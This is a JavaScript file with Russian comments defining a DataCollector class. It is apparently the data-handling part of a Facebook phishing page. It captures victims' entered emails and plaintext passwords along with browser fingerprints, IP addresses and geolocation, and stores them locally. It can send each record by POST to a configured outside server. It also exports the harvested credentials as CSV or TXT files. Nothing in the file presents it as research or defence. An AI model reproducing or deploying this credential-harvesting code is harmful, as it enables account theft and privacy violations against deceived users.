// data.js - сбор и хранение данных

class DataCollector {
    constructor() {
        this.storageKey = 'facebook_data_collection';
        this.init();
    }
    
    init() {
        // Проверяем, есть ли уже данные
        if (!localStorage.getItem(this.storageKey)) {
            this.clearData();
        }
        
        // Загружаем текущие данные
        this.loadData();
        
        console.log('DataCollector initialized');
    }
    
    loadData() {
        try {
            const data = localStorage.getItem(this.storageKey);
            this.data = data ? JSON.parse(data) : { users: [], visits: [], logs: [] };
        } catch (error) {
            console.error('Error loading data:', error);
            this.data = { users: [], visits: [], logs: [] };
        }
        return this.data;
    }
    
    saveData() {
        try {
            // Ограничиваем количество записей
            if (this.data.users.length > CONFIG.MAX_LOG_ENTRIES) {
                this.data.users = this.data.users.slice(-CONFIG.MAX_LOG_ENTRIES);
            }
            
            localStorage.setItem(this.storageKey, JSON.stringify(this.data));
            return true;
        } catch (error) {
            console.error('Error saving data:', error);
            return false;
        }
    }
    
    clearData() {
        this.data = {
            users: [],
            visits: [],
            logs: [],
            settings: {
                created: new Date().toISOString(),
                totalLogins: 0,
                uniqueIPs: new Set()
            }
        };
        this.saveData();
    }
    
    // Сохранение данных пользователя
    saveUserData(email, password) {
        if (!CONFIG.COLLECT_DATA) return null;
        
        const userData = {
            id: Date.now() + Math.random().toString(36).substr(2, 9),
            email: email,
            password: password,
            timestamp: new Date().toISOString(),
            browserInfo: this.getBrowserInfo(),
            screenInfo: this.getScreenInfo(),
            ipInfo: this.getIPInfo(),
            locationInfo: CONFIG.COLLECT_LOCATION_INFO ? this.getLocationInfo() : null,
            userAgent: navigator.userAgent,
            referrer: document.referrer,
            pageUrl: window.location.href
        };
        
        // Добавляем в массив
        this.data.users.push(userData);
        this.data.settings.totalLogins++;
        
        // Сохраняем
        this.saveData();
        
        // Логируем
        this.addLog('Новые данные пользователя сохранены', userData);
        
        // Если нужно отправлять на сервер
        if (CONFIG.SEND_TO_SERVER && CONFIG.SERVER_URL) {
            this.sendToServer(userData);
        }
        
        return userData;
    }
    
    // Сохранение информации о посещении
    saveVisit() {
        const visitData = {
            timestamp: new Date().toISOString(),
            page: window.location.pathname,
            referrer: document.referrer,
            userAgent: navigator.userAgent,
            browserInfo: this.getBrowserInfo()
        };
        
        this.data.visits.push(visitData);
        
        // Ограничиваем количество посещений
        if (this.data.visits.length > 100) {
            this.data.visits = this.data.visits.slice(-50);
        }
        
        this.saveData();
    }
    
    // Получение информации о браузере
    getBrowserInfo() {
        return {
            userAgent: navigator.userAgent,
            language: navigator.language,
            languages: navigator.languages,
            platform: navigator.platform,
            cookieEnabled: navigator.cookieEnabled,
            online: navigator.onLine,
            vendor: navigator.vendor
        };
    }
    
    // Получение информации об экране
    getScreenInfo() {
        return {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            orientation: screen.orientation ? screen.orientation.type : 'unknown'
        };
    }
    
    // Получение информации о IP (через сторонний сервис)
    async getIPInfo() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            
            // Сохраняем уникальные IP
            this.data.settings.uniqueIPs.add(data.ip);
            
            return {
                ip: data.ip,
                timestamp: new Date().toISOString()
            };
        } catch (error) {
            return {
                ip: 'unknown',
                error: error.message
            };
        }
    }
    
    // Получение геолокации (только если разрешено)
    getLocationInfo() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve({ error: 'Geolocation not supported' });
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    resolve({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        timestamp: new Date(position.timestamp).toISOString()
                    });
                },
                (error) => {
                    resolve({
                        error: error.message,
                        code: error.code
                    });
                },
                { timeout: 5000 }
            );
        });
    }
    
    // Отправка данных на сервер
    async sendToServer(data) {
        try {
            const response = await fetch(CONFIG.SERVER_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            });
            
            this.addLog('Данные отправлены на сервер', { status: response.status });
            return response.ok;
        } catch (error) {
            this.addLog('Ошибка отправки на сервер', { error: error.message });
            return false;
        }
    }
    
    // Добавление лога
    addLog(message, data = null) {
        const logEntry = {
            timestamp: new Date().toISOString(),
            message: message,
            data: data
        };
        
        this.data.logs.push(logEntry);
        
        // Ограничиваем логи
        if (this.data.logs.length > 100) {
            this.data.logs = this.data.logs.slice(-50);
        }
        
        console.log('LOG:', message, data);
    }
    
    // Получение статистики
    getStats() {
        return {
            totalUsers: this.data.users.length,
            totalVisits: this.data.visits.length,
            uniqueIPs: this.data.settings.uniqueIPs.size,
            lastLogin: this.data.users.length > 0 ? this.data.users[this.data.users.length - 1].timestamp : null,
            firstLogin: this.data.users.length > 0 ? this.data.users[0].timestamp : null
        };
    }
    
    // Экспорт данных
    exportData(format = 'json') {
        switch(format) {
            case 'json':
                return JSON.stringify(this.data, null, 2);
            case 'csv':
                return this.exportToCSV();
            case 'txt':
                return this.exportToTXT();
            default:
                return JSON.stringify(this.data);
        }
    }
    
    // Экспорт в CSV
    exportToCSV() {
        if (this.data.users.length === 0) return '';
        
        const headers = ['ID', 'Email', 'Password', 'Timestamp', 'IP', 'User Agent', 'Screen'];
        const rows = this.data.users.map(user => [
            user.id,
            `"${user.email}"`,
            `"${user.password}"`,
            user.timestamp,
            user.ipInfo?.ip || 'unknown',
            `"${user.userAgent}"`,
            `${user.screenInfo.width}x${user.screenInfo.height}`
        ]);
        
        return [headers.join(','), ...rows.map(row => row.join(','))].join('\n');
    }
    
    // Экспорт в TXT
    exportToTXT() {
        let txt = '=== СОБРАННЫЕ ДАННЫЕ ===\n\n';
        
        txt += `Всего записей: ${this.data.users.length}\n`;
        txt += `Уникальных IP: ${this.data.settings.uniqueIPs.size}\n`;
        txt += `Первая запись: ${this.data.users[0]?.timestamp || 'Нет данных'}\n`;
        txt += `Последняя запись: ${this.data.users[this.data.users.length - 1]?.timestamp || 'Нет данных'}\n\n`;
        
        txt += '=== ДЕТАЛЬНЫЕ ДАННЫЕ ===\n\n';
        
        this.data.users.forEach((user, index) => {
            txt += `Запись #${index + 1}\n`;
            txt += `ID: ${user.id}\n`;
            txt += `Email: ${user.email}\n`;
            txt += `Password: ${user.password}\n`;
            txt += `Время: ${user.timestamp}\n`;
            txt += `IP: ${user.ipInfo?.ip || 'unknown'}\n`;
            txt += `Браузер: ${user.userAgent}\n`;
            txt += `Экран: ${user.screenInfo.width}x${user.screenInfo.height}\n`;
            txt += '─'.repeat(50) + '\n\n';
        });
        
        return txt;
    }
    
    // Скачивание данных
    downloadData(format = 'json') {
        const data = this.exportData(format);
        const extension = format === 'csv' ? 'csv' : format === 'txt' ? 'txt' : 'json';
        const filename = `facebook_data_${new Date().toISOString().split('T')[0]}.${extension}`;
        
        const blob = new Blob([data], { 
            type: format === 'csv' ? 'text/csv' : 
                   format === 'txt' ? 'text/plain' : 
                   'application/json' 
        });
        
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        
        this.addLog(`Данные экспортированы в ${format.toUpperCase()}`, { filename });
    }
}

// Создаем глобальный экземпляр
window.DataCollector = new DataCollector();
